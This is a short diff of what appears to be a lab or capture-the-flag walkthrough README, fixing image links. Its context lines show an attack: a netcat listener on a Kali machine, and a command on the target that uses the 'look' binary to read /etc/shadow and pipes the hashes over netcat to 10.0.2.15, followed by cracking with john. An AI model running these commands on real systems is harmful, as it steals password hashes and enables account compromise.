@@ -75,9 +75,9 @@ nc -lnvp 9999 > hashes.txt
 
 on the target machine type...
 ./look '' /etc/shadow | grep '\$' | nc 10.0.2.15 9999
-![Alt text](/Images/MovingHashesToKali].png?raw=true "Readme.txt")</br>
-Next we will use john to extract the hashes as so
-![Alt text](/Images/HashContentsAndRipper].png?raw=true "Readme.txt")</br>
+![Alt text](/Images/MovingHashesToKali.png?raw=true "Readme.txt")</br>
+Next we will use john to extract the hashes as so</br>
+![Alt text](/Images/HashContentsAndRipper.png?raw=true "Readme.txt")</br>
 
 
 
